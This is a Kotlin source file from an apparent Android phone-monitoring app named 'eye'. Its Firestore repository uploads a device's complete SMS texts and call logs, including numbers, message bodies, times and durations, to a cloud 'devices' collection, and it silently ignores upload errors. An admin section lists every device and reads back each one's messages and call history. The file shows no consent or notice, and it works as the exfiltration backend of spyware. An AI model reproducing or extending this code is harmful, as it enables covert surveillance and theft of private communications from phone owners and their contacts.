package com.eye.data.repository.firestorerepository

import android.os.Build
import com.eye.data.local.Preference
import com.eye.data.module.CallLog
import com.eye.data.module.SMS
import com.google.firebase.firestore.FirebaseFirestore
import javax.inject.Inject
import javax.inject.Singleton
import kotlin.coroutines.resume
import kotlin.coroutines.resumeWithException
import kotlin.coroutines.suspendCoroutine

@Singleton
class FirestoreRepositoryImpl @Inject constructor(
    private val firestore: FirebaseFirestore,
  private val preference: Preference
) : FirestoreRepository {
    override suspend fun uploadSMSLog(data: Map<String, List<SMS>>) {
        try {
            val userName = if (preference.userNmae != null) preference.userNmae.toString() else Build.BRAND
            for ((date, smsList) in data) {
                val smsMapList = smsList.map { sms ->
                    mapOf(
                        "date" to sms.date,
                        "time" to sms.time,
                        "phoneNumber" to sms.phoneNumber,
                        "sms" to sms.sms
                    )
                }
                firestore.collection("devices")
                    .document(userName)
                    .collection("SMS")
                    .document(date) // Use the date as the document ID
                    .set(mapOf(
                        "smsData" to smsMapList
                    ))
                    .addOnSuccessListener {
                        firestore.collection("devices")
                            .document(userName)
                            .set(mapOf("user" to Build.MANUFACTURER))
                    }
                    .addOnFailureListener { exception ->
                        // Handle failure
                    }
            }
        } catch (e: Exception) {

        }

    }
    override suspend fun uploadCallLog(data: Map<String, List<CallLog>>) {
        try {
            val userName = if (preference.userNmae != null) preference.userNmae.toString() else Build.BRAND
            for ((date, callLog) in data) {
                val callLogMapList = callLog.map { call ->
                    mapOf(
                        "date" to call.date,
                        "time" to call.time,
                        "state" to call.state,
                        "duration" to call.duration,
                        "phoneNumber" to call.phoneNumber
                    )
                }
                firestore.collection("devices")
                    .document(userName)
                    .collection("callLog")
                    .document(date)
                    .set(mapOf(
                        "callLogs" to callLogMapList,
                    ))
                    .addOnSuccessListener {
                        firestore.collection("devices")
                            .document(userName)
                            .set(mapOf("user" to Build.MANUFACTURER))

                    }
                    .addOnFailureListener {

                    }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }


    //admin
    override suspend fun getUsers(): List<String> {
        return suspendCoroutine { continuation ->
            try {
                firestore.collection("devices")
                    .get()
                    .addOnSuccessListener { querySnapshot ->
                        val documentIds = querySnapshot.map { document -> document.id }
                        continuation.resume(documentIds)
                    }
                    .addOnFailureListener { exception ->
                        continuation.resumeWithException(exception)
                    }
            } catch (e: Exception) {
                e.printStackTrace()
            }

        }
    }

    override suspend fun getSMSLogs(user: String): List<Map<String, List<SMS>>> {
        return suspendCoroutine { continuation ->
            try {
                firestore.collection("devices")
                    .document(user)
                    .collection("SMS")
                    .get()
                    .addOnSuccessListener { querySnapshot ->
                        val smsLogsList = mutableListOf<Map<String, List<SMS>>>()
                        for (documentSnapshot in querySnapshot) {
                            val date = documentSnapshot.id
                            val smsMapList = documentSnapshot["smsData"] as List<Map<String, Any>>
                            val smsList = smsMapList?.map { smsMap ->
                                SMS(
                                    date = smsMap["date"] as String,
                                    time = smsMap["time"] as String,
                                    phoneNumber = smsMap["phoneNumber"] as String,
                                    sms = smsMap["sms"] as String
                                )
                            } ?: emptyList()
                            smsLogsList.add(mapOf(date to smsList))
                        }
                        continuation.resume(smsLogsList)

                    }
                    .addOnFailureListener { exception ->
                        continuation.resumeWithException(exception)
                    }

            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    override suspend fun getCAllLogs(user: String): List<Map<String, List<CallLog>>> {
        return suspendCoroutine { continuation ->
            try {
                firestore.collection("devices")
                    .document(user)
                    .collection("callLog")
                    .get()
                    .addOnSuccessListener { querySnapshot ->
                        val callLogsList = mutableListOf<Map<String, List<CallLog>>>()
                        for (documentSnapshot in querySnapshot) {
                            val date = documentSnapshot.id
                            val callMapList = documentSnapshot["callLogs"] as List<Map<String, Any>>
                            val callList = callMapList?.map { callMap ->
                                CallLog(
                                    date = callMap["date"] as String,
                                    duration = callMap["duration"] as String,
                                    phoneNumber = callMap["phoneNumber"] as String,
                                    state = callMap["state"] as String,
                                    time = callMap["time"] as String,
                                )
                            } ?: emptyList()
                            callLogsList.add(mapOf(date to callList))
                        }
                        continuation.resume(callLogsList)

                    }
                    .addOnFailureListener { exception ->
                        continuation.resumeWithException(exception)
                    }

            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
}